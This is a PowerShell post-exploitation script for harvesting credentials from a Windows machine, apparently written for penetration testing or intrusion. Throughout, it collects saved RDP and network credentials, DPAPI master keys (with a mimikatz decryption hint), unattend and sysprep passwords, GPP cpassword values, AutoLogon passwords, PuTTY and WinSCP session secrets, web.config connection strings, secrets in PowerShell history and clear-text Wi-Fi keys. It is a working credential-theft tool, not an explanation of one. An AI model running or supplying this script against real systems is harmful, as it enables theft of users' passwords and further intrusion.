<#
.SYNOPSIS
    Hunt for stored credentials reachable from current user context.
#>
function Section($t) { Write-Host "`n=== $t ===" -ForegroundColor Cyan }

Section "cmdkey /list (saved RDP/network creds)"
cmdkey /list

Section "Credential Manager blob files"
Get-ChildItem -Hidden -Recurse `
    "$env:USERPROFILE\AppData\Local\Microsoft\Credentials" `
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Credentials" -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime

Section "DPAPI master keys (decrypt with mimikatz dpapi::masterkey)"
Get-ChildItem -Hidden -Recurse `
    "$env:USERPROFILE\AppData\Local\Microsoft\Protect" `
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Protect" -ErrorAction SilentlyContinue |
    Select-Object FullName

Section "Unattended-install configs"
$paths = @(
    'C:\Windows\Panther\Unattend.xml',
    'C:\Windows\Panther\Unattended.xml',
    'C:\Windows\Panther\Unattend\Unattended.xml',
    'C:\Windows\Panther\Unattend\Unattend.xml',
    'C:\Windows\System32\sysprep\sysprep.xml',
    'C:\Windows\System32\sysprep\sysprep.inf',
    'C:\Windows\system32\sysprep.inf',
    'C:\Windows\Panther\unattend.txt',
    'C:\unattend.xml',
    'C:\unattend.inf',
    'C:\autounattend.xml'
)
foreach ($p in $paths) {
    if (Test-Path $p) {
        Write-Host "[+] $p" -ForegroundColor Green
        Select-String -Path $p -Pattern 'Password|UserAccount|AutoLogon' -ErrorAction SilentlyContinue
    }
}

Section "Group Policy Preferences (cpassword XML)"
$gppPaths = @("\\$env:USERDNSDOMAIN\SYSVOL","C:\ProgramData\Microsoft\Group Policy\History")
foreach ($p in $gppPaths) {
    if (Test-Path $p) {
        Get-ChildItem $p -Recurse -ErrorAction SilentlyContinue `
            -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' |
            ForEach-Object {
                Write-Host "[+] $($_.FullName)" -ForegroundColor Green
                Select-String -Path $_.FullName -Pattern 'cpassword' -ErrorAction SilentlyContinue
            }
    }
}

Section "AutoLogon registry"
$al = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue
if ($al) {
    if ($al.DefaultUserName) { Write-Host "DefaultUserName : $($al.DefaultUserName)" -ForegroundColor Yellow }
    if ($al.DefaultPassword) { Write-Host "DefaultPassword : $($al.DefaultPassword)" -ForegroundColor Green }
    if ($al.DefaultDomain)   { Write-Host "DefaultDomain   : $($al.DefaultDomain)" }
}

Section "PuTTY saved sessions"
Get-ChildItem 'HKCU:\Software\SimonTatham\PuTTY\Sessions' -ErrorAction SilentlyContinue |
    ForEach-Object {
        $s = Get-ItemProperty $_.PSPath
        "Session=$($_.PSChildName) Host=$($s.HostName) User=$($s.UserName) ProxyUser=$($s.ProxyUsername) ProxyPass=$($s.ProxyPassword)"
    }

Section "WinSCP saved sessions"
Get-ChildItem 'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions' -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Select-Object PSChildName, HostName, UserName, Password

Section "IIS web.config files"
Get-ChildItem 'C:\inetpub' -Recurse -Filter web.config -ErrorAction SilentlyContinue |
    Select-Object -First 50 FullName |
    ForEach-Object {
        Write-Host "[+] $($_.FullName)" -ForegroundColor Green
        Select-String -Path $_.FullName -Pattern 'connectionString|password=' -ErrorAction SilentlyContinue |
            Select-Object -First 5
    }

Section "PowerShell history"
$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $hist) {
    Select-String -Path $hist -Pattern 'password|passwd|secret|token|api[_-]?key|-Credential' -ErrorAction SilentlyContinue
}

Section "WiFi profiles (with passwords)"
$profiles = netsh wlan show profiles | Select-String 'All User Profile'
foreach ($line in $profiles) {
    $name = ($line -split ':')[1].Trim()
    if ($name) {
        $details = netsh wlan show profile name="$name" key=clear
        $pw = $details | Select-String 'Key Content'
        if ($pw) { Write-Host "[+] $name : $pw" -ForegroundColor Green }
    }
}
